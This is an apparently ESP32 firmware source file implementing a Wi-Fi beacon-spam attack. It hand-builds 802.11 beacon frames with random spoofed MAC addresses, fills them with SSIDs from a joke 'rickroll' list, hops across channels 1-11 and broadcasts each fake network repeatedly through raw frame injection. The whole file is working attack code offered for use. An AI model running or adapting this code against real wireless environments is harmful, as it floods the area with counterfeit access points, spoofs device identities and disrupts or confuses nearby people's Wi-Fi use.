#include "wifi_attack_task.h"
#include "literals.h"

char emptySSID[32];
const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}; // used Wi-Fi channels (available: 1-14)
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;

uint32_t notificationWifiValue;
BaseType_t xWifiResult;

void wifi_attack_task(void *pv) {
    while (1) {
        beaconAttack();
        xWifiResult = xTaskNotifyWait(0, 0, &notificationWifiValue, 0);
        if (xWifiResult == pdTRUE && notificationWifiValue == STOP_ATTACK)  break; // Check the variable without changing it
    }
    //free(params); // no params to free here
    vTaskDelete(NULL);
}

void beaconAttack() {
    // change WiFi mode
    WiFi.mode(WIFI_MODE_STA);
    // create empty SSID
    for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
    // for random generator
    randomSeed(1);
    beaconSpamList(rickrollssids);
    wifiDisconnect();
}

void beaconSpamList(const char list[]) {
    // beacon frame definition
    uint8_t beaconPacket[109] = {
        /*  0 - 3  */
        0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
        /*  4 - 9  */ 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
        /* 10 - 15 */
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
        /* 16 - 21 */
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
        // Fixed parameters
        /* 22 - 23 */
        0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
        /* 24 - 31 */
        0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
        /* 32 - 33 */
        0xe8, 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
        /* 34 - 35 */
        0x31, 0x00, // capabilities Tnformation
        // Tagged parameters
        // SSID parameters
        /* 36 - 37 */
        0x00, 0x20, // Tag: Set SSID length, Tag length: 32
        /* 38 - 69 */
        0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
        0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
        0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
        0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
        // Supported Rates
        /* 70 - 71 */
        0x01, 0x08, // Tag: Supported Rates, Tag length: 8
        /* 72 */
        0x82, // 1(B)
        /* 73 */
        0x84, // 2(B)
        /* 74 */
        0x8b, // 5.5(B)
        /* 75 */
        0x96, // 11(B)
        /* 76 */
        0x24, // 18
        /* 77 */
        0x30, // 24
        /* 78 */
        0x48, // 36
        /* 79 */
        0x6c, // 54
        // Current Channel
        /* 80 - 81 */
        0x03, 0x01, // Channel set, length
        /* 82 */
        0x01, // Current Channel
        // RSN information
        /*  83 -  84 */
        0x30, 0x18,
        /*  85 -  86 */
        0x01, 0x00,
        /*  87 -  90 */
        0x00, 0x0f, 0xac, 0x02,
        /*  91 -  92 */
        0x02, 0x00,
        /*  93 - 100 */
        0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /* Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. 
                                                           WPA2 with TKIP not supported by many devices*/
        /* 101 - 102 */
        0x01, 0x00,
        /* 103 - 106 */
        0x00, 0x0f, 0xac, 0x02,
        /* 107 - 108 */
        0x00, 0x00};

    // temp variables
    int i = 0;
    int j = 0;
    char tmp;
    uint8_t macAddr[6];
    int ssidsLen = strlen_P(list);

    // go to next channel
    nextChannel();

    while (i < ssidsLen) {
        // read out next SSID
        // read out next SSID
        j = 0;
        do {
            tmp = pgm_read_byte(list + i + j);
            j++;
        } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);

        uint8_t ssidLen = j - 1;

        // set MAC address
        generateRandomWiFiMac(macAddr);

        // write MAC address into beacon frame
        memcpy(&beaconPacket[10], macAddr, 6);
        memcpy(&beaconPacket[16], macAddr, 6);

        // reset SSID
        memcpy(&beaconPacket[38], emptySSID, 32);

        // write new SSID into beacon frame
        memcpy_P(&beaconPacket[38], &list[i], ssidLen);
        // set channel for beacon frame
        beaconPacket[82] = wifi_channel;
        beaconPacket[34] = 0x31; // wpa

        // send packet
        for (int k = 0; k < 3; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), 0);
            vTaskDelay(1 / portTICK_RATE_MS);
        }
        i += j;
    }
}

void generateRandomWiFiMac(uint8_t *mac) {
    for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
}

void nextChannel() {
    if (sizeof(channels) > 1) {
        uint8_t ch = channels[channelIndex];
        channelIndex++;
        if (channelIndex > sizeof(channels)) channelIndex = 0;

        if (ch != wifi_channel && ch >= 1 && ch <= 14) {
            wifi_channel = ch;
            // wifi_set_channel(wifi_channel);
            esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
        }
    }
}

void wifiDisconnect() {
    WiFi.softAPdisconnect(true); // turn off AP mode
    WiFi.disconnect(true, true); // turn off STA mode
    WiFi.mode(WIFI_OFF);         // enforces WIFI_OFF mode
}